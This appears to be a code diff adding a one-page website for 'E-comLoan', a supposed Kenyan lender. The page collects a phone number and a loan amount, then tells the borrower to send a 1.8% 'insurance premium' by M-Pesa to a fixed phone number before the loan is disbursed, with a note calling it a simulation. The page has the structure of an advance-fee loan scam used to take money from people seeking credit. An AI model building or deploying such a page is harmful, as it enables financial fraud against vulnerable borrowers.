@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>E-comLoan</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #fff;
+      color: #333;
+    }
+
+    header {
+      text-align: center;
+      padding: 20px;
+    }
+
+    .brand {
+      color: orange;
+      margin: 0;
+    }
+
+    .domain {
+      color: #555;
+      font-size: 13px;
+    }
+
+    main {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .title {
+      font-size: 18px;
+      margin-bottom: 25px;
+      font-weight: 600;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    input, select {
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      background-color: #8BC34A;
+      color: white;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #7CB342;
+    }
+
+    #response {
+      margin-top: 20px;
+      font-size: 15px;
+      color: green;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      font-size: 14px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1 class="brand">E-COMLOAN</h1>
+    <p class="domain">E-comloan.co.ke</p>
+  </header>
+
+  <main>
+    <h2 class="title">Proceed to pay the 1.8% insurance premium for loan disbursement to your mpesa phone number</h2>
+
+    <form id="loanForm">
+      <label for="phone">Phone Number</label>
+      <input type="tel" id="phone" placeholder="Phone number e.g., 07xxxxxxxx" required />
+
+      <label for="amount">Loan Amount</label>
+      <input type="number" id="amount" placeholder="Loan Amount" required />
+
+      <label for="period">Repayment Period</label>
+      <select id="period" required>
+        <option value="" disabled selected>Select...</option>
+        <option value="1">1 Month</option>
+        <option value="3">3 Months</option>
+        <option value="6">6 Months</option>
+      </select>
+
+      <button type="submit">Get Loan</button>
+    </form>
+
+    <div id="response" class="hidden"></div>
+  </main>
+
+  <footer>
+    <p>© 2024 E-comLoan LTD</p>
+  </footer>
+
+  <script>
+    document.getElementById("loanForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const phone = document.getElementById("phone").value;
+      const amount = parseFloat(document.getElementById("amount").value);
+      const insuranceFee = (amount * 0.018).toFixed(2);
+      const paybillNumber = "0702428513";
+
+      const responseBox = document.getElementById("response");
+
+      responseBox.classList.remove("hidden");
+      responseBox.innerHTML = `
+        <strong>Payment Instructions:</strong><br><br>
+        Please send <strong>KES ${insuranceFee}</strong> to <strong>${paybillNumber}</strong> via M-Pesa<br>
+        from your phone number <strong>${phone}</strong> to proceed with loan disbursement.<br><br>
+        <em>(Simulation - No actual transaction is triggered)</em>
+      `;
+    });
+  </script>
+</body>
+</html>
+
